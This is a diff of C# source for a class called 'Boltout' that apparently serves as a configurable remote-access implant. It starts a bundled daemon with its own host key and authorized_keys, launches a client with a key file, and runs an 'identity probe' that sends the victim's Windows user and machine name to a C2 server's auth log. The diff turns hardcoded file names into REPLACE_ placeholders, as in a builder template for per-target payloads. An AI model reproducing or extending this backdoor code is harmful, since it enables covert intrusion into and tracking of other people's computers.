@@ -88,10 +88,10 @@ public class Boltout
             string userName = "REPLACE_USERNAME";
             string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
 
-            string boltd = Path.Combine(baseDirectory, "BoltFiles", "boltd.exe");
-            string boltHostKey = Path.Combine(baseDirectory, "BoltFiles", "bolt_key");
-            string boltConfig = Path.Combine(baseDirectory, "BoltFiles", "boltd-config");
-            string boltAllow = Path.Combine(baseDirectory, "BoltFiles", "authorized_keys");
+            string boltd = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTD_EXE");
+            string boltHostKey = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLT_KEY_FILE");
+            string boltConfig = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTD_CONFIG");
+            string boltAllow = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "authorized_keys");
 
             Process boltdStart = new Process();
             boltdStart.StartInfo.FileName = boltd;
@@ -101,8 +101,8 @@ public class Boltout
 
             Thread.Sleep(REPLACE_STARTUP_DELAY_MS);
 
-            string boltCon = Path.Combine(baseDirectory, "BoltFiles", "boltcon.exe");
-            string boltKey = Path.Combine(baseDirectory, "BoltFiles", "REPLACE_KEYFILE_NAME");
+            string boltCon = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTCON_EXE");
+            string boltKey = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_KEYFILE_NAME");
 
             // Identity probe: one failed auth logs Windows user+machine to C2 auth log
             string probeUser = SanitizeUsername(Environment.UserName + "." + Environment.MachineName);
